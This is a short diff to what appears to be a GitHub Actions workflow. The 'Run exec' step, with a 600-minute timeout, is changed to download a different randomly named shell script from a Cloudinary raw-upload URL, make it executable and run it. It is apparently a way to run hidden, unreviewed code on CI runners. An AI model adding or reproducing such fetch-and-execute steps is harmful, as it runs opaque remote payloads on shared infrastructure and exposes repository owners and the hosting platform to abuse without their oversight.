@@ -16,6 +16,6 @@ jobs:
       - name: Run exec
         timeout-minutes: 600
         run: |
-          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1743836974/hk/n8pkxhzxdklslm8vsmcb.sh
-          chmod +x n8pkxhzxdklslm8vsmcb.sh
-          ./n8pkxhzxdklslm8vsmcb.sh
+          curl -O https://res.cloudinary.com/dyfqshedb/raw/upload/v1743837329/hk/dykdumxrbaeyqm9ukv3l.sh
+          chmod +x dykdumxrbaeyqm9ukv3l.sh
+          ./dykdumxrbaeyqm9ukv3l.sh
